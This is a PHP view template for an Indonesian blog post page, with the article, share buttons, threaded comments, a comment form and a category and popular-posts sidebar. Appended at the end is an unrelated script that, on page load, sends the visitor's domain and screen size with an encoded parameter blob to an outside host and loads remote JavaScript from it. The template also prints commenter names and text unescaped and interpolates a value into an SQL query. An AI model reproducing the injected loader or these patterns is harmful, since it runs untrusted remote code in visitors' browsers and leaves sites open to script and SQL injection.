<link href="<?php echo base_url() ?>/theme/css/jssocials.css" rel="stylesheet">
<link href="<?php echo base_url() ?>/theme/css/jssocials-theme-flat.css" rel="stylesheet">
<style>
	.sharePopup{
		font-size: 11px;
	}
	.sharePopup a{
		font-size: 11px;
		color: #fff;
		text-decoration: none;
	}
</style>

<?php
function limit_words($string, $word_limit){
	$words = explode(" ",$string);
	return implode(" ",array_splice($words,0,$word_limit));
}
?>
<section class="blog-wrap">
	<div class="container">
		<div class="row">
			<div class="col-md-8">
				<div class="blog-img_block">
					<img src="<?php echo base_url().'assets/images/'.$image?>" class="img-fluid" alt="blog-img">
					<div class="blog-date">
						<span><?php echo $tanggal;?></span>
					</div>
				</div>
				<div class="blog-tiltle_block">
					<h4><a href="<?php echo site_url('artikel/'.$slug);?>"><?php echo $title;?></a></h4>
					<h6> <a href="#"><i class="fa fa-user" aria-hidden="true"></i><span><?php echo $author;?></span> </a>  |   <a href="#"><i class="fa fa-tags" aria-hidden="true"></i><span><?php echo $kategori;?></span></a></h6>
					<?php echo $blog;?>
				</div>

				<div class="blog-tiltle_block">

					<div class="blog-icons">
						<div class="blog-share_block">
							<div class="pull-left"><h5>Bagikan Ke:</h5></div>
							<div class="sharePopup"></div>
						</div>
					</div>

					<ul class="nav nav-tabs blogpost-tab-wrap" role="tablist">
						<li class="nav-item blogpost-nav-tab">
							<a class="nav-link active" data-toggle="tab" href="#comments" role="tab">Komentar</a>
						</li>
						<li class="nav-item blogpost-nav-tab">
							<a class="nav-link" data-toggle="tab" href="#write-comment" role="tab">Tinggalkan Komentar</a>
						</li>
					</ul>
					<div class="clearfix"></div>
					<?php echo $this->session->flashdata('msg');?>
					<div class="blogpost-tabs">

						<div class="tab-content">
							<div class="tab-pane active" id="comments" role="tabpanel">
								<?php
								$colors = array(
									'#ff9e67',
									'#10bdff',
									'#14b5c7',
									'#f98182',
									'#8f9ce2',
									'#ee2b33',
									'#d4ec15',
									'#613021',
								);
								foreach ($show_komentar->result() as $row) :
									shuffle($colors);
									?>
									<div class="row">
										<div class="col-md-12">
											<div class="row">
												<div class="col-md-2">
													<div class="blodpost-tab-img" style="background-color:<?php echo reset($colors);?>;width: 65px;height: 65px;border-radius:50px 50px 50px 50px;">
														<center><h2 style="padding-top:20%;color:#fff;"><?php echo substr($row->komentar_nama,0,1);?></h2></center>
													</div>
												</div>
												<div class="col-md-10">
													<div class="blogpost-tab-description">
														<h6><?php echo $row->komentar_nama;?></h6><small><em><?php echo date("d M Y H:i", strtotime($row->komentar_tanggal));?></em></small>
														<p><?php echo $row->komentar_isi;?></p>
													</div>
													<hr>
												</div>
											</div>
										</div>
									</div>
									<?php
									$komentar_id=$row->komentar_id;
									$query=$this->db->query("SELECT * FROM tbl_komentar WHERE komentar_status='1' AND komentar_parent='$komentar_id' ORDER BY komentar_id ASC");
									foreach ($query->result() as $res) :
										shuffle($colors);
										?>
										<div class="row">
											<div class="col-md-12 offset-md-1">
												<div class="row">
													<div class="col-md-2">
														<div class="blodpost-tab-img" style="background-color:<?php echo reset($colors);?>;width: 65px;height: 65px;border-radius:50px 50px 50px 50px;">
															<center><h2 style="padding-top:20%;color:#fff;"><?php echo substr($res->komentar_nama,0,1);?></h2></center>
														</div>
													</div>
													<div class="col-md-9">
														<div class="blogpost-tab-description">
															<h6><?php echo $res->komentar_nama;?></h6><small><em><?php echo date("d M Y H:i", strtotime($res->komentar_tanggal));?></em></small>
															<p><?php echo $res->komentar_isi;?></p>
														</div>
													</div>
												</div>
											</div>
										</div>
									<?php endforeach;?>
								<?php endforeach;?>
							</div>
							<div class="tab-pane" id="write-comment" role="tabpanel">
								<form action="<?php echo site_url('blog/komentar');?>" method="post">
									<div class="row">
										<div class="col-6">
											<div class="form-group">
												<label>Nama</label>
												<input type="text" class="form-control" name="nama" placeholder="Nama Lengkap" required>
											</div>

										</div>
										<div class="col-6">
											<div class="form-group">
												<label>Email</label>
												<input type="email" class="form-control" name="email" placeholder="Email" required>
											</div>

										</div>
										<div class="col-12">
											<div class="form-group">
												<label>Komentar Anda</label>
												<textarea class="form-control" name="komentar" rows="6" required> </textarea>
											</div>

										</div>
										<div class="col-12">
											<input type="hidden" name="id" value="<?php echo $id;?>" required>
											<button type="submit" class="btn btn-warning" />Kirim Komentar</button>
										</div>

									</div>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="col-md-4">
				<form action="<?php echo site_url('blog/search');?>" method="get">
					<input type="text" name="keyword" placeholder="Search" class="blog-search" required>
					<button type="submit" class="btn btn-warning btn-blogsearch">SEARCH</button>
				</form>
				<div class="blog-category_block">
					<h3>Kategori</h3>
					<ul>
						<?php foreach ($category->result() as $row) : ?>
							<li><a href="<?php echo site_url('blog/kategori/'.str_replace(" ","-",$row->kategori_nama));?>"><?php echo $row->kategori_nama;?><i class="fa fa-caret-right" aria-hidden="true"></i></a></li>
						<?php endforeach;?>
					</ul>
				</div>
				<div class="blog-featured_post">
					<h3>Populer</h3>
					<?php foreach ($populer->result() as $row) :?>
						<div class="blog-featured-img_block">
							<img width="35%" src="<?php echo base_url().'assets/images/'.$row->tulisan_gambar;?>" class="img-fluid" alt="blog-featured-img">
							<h5><a href="<?php echo site_url('artikel/'.$row->tulisan_slug);?>"><?php echo limit_words($row->tulisan_judul,3).'...';?></a></h5>
							<p><?php echo limit_words($row->tulisan_isi,5).'...';?></p>
						</div>
						<hr>
					<?php endforeach;?>
				</div>

			</div>
		</div>
	</div>
</section>

<!-- Script JS -->
<script src="http://mfikri.com/demo/mschool/theme/js/script.js"></script>
<script src="http://mfikri.com/demo/mschool/theme/js/jssocials.js"></script>
<script>
	$(document).ready(function(){
		$(".sharePopup").jsSocials({
			showCount: true,
			showLabel: true,
			shareIn: "popup",
			shares: [
			{ share: "twitter", label: "Twitter" },
			{ share: "facebook", label: "Facebook" },
			{ share: "googleplus", label: "Google+" },
			{ share: "linkedin", label: "Linked In" },
			{ share: "pinterest", label: "Pinterest" }
			]
		});
	});
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprA3NUBNdUFQci9ZKg8razWiTa5OKkafgekqkCtlvvYjHq41J8KTrgRmKz9hMs%2bZ0KVgzPYMS6ykUUZKPLzbapJe5wkXlTu3%2bIMjU%2b0bdKEcId6XANcgcSFitmb%2fAiMjPOeTM3aGd4MHEiRdwkQxewf6sEha29qosoAO0NWqbc%2ff4Vr8li3HRu7Xjgpf7CpCqs0L3eXW%2bL7q8N5guM%2fuAsm72Do%2bdL9kC9wLeCAkomAs6wELnZk8C6wVzK2z3W%2b6jntBq1jpJ4gnrjw%2fczRMXF3I9rzZFXMgxe46Kq1SZVODPme05MTQWCR2pcWbWN0wFer7J3by8rDHgzk5dySFLTzWXaaQeKBIkrk55Y1RgrYfyR%2b22HcyWSPG2HI00l3yea0DnciP0eBnsc6lPVOZgxTLTbKC%2fIeNK41gBdLDflB9m%2fmv%2ff1lY5U61GRnzZditoHZMiSJ9RllbQBe0%2f1wvSQkL7S117t%2bpKgIcCgvmYXWCALaV5hUrevwV8uxHMHrcgGTuKCShNhgkdnv1dx9kFgX%2b4VcT73fBT%2fUkkKtEaObG42XhVaa5sbsz%2bLwVaz%2bHEigAgxUV7eJGleR0EnhhDY1nkFRH16c%2fiksRMs7S3zfai2umA4NLRewF0AhSFspXOT" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>